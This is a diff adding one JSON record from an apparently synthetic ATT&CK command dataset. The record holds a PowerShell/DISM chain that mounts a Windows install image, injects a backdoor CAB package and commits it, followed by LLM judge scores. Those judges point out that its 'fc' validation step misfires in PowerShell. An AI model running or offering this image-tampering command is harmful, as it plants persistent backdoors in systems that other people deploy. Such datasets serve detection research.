@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; dism /Image:C:\\Mount\\Install /Add-Package /PackagePath:C:\\Payloads\\BackdoorSvc.cab; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+  "explanation": "Adds a custom package to the offline Windows image to implant components, then validates the change via checksum and binary comparison against a baseline image.",
+  "rationale_steps": [
+    "Mount the image to allow package injection.",
+    "Install a malicious CAB package into the system image.",
+    "Commit and unmount to finalize the system image patch.",
+    "Verify post-modification integrity with hashing and fc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-f36912a6",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed DISM and PowerShell command chain with valid flags, paths, and separators; no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "Appropriately mounts and modifies an offline Windows image consistent with T1601, but it requires admin privileges (not 'None') and the fc call in PowerShell resolves to Format-Custom rather than file compare, weakening the stated validation.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:02:41.391548Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The commands are well-formed with valid DISM flags and PowerShell cmdlets, though mixing cmd-style (fc /b) and PowerShell commands in a single semicolon-chained sequence may cause issues since fc is a cmd built-in not natively available in PowerShell without cmd.exe invocation.",
+        "semantic_score": 4,
+        "semantic_justification": "The sequence correctly demonstrates offline Windows image modification (mounting a WIM, injecting a backdoor package via CAB, committing changes) which aligns well with T1601 firmware/image tampering, and the checksum/binary comparison steps accurately reflect integrity validation against a baseline, though the 'Privilege: None' claim is incorrect as DISM mount and image modification operations require administrator privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T01:11:34.392786Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command string correctly uses semicolons to chain valid DISM, PowerShell, and cmd-builtin commands with appropriate flags and paths.",
+        "semantic_score": 5,
+        "semantic_justification": "The command sequence accurately performs an offline modification of a Windows image by mounting, injecting a package, and committing changes, which perfectly matches T1601.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:11:35.826025Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
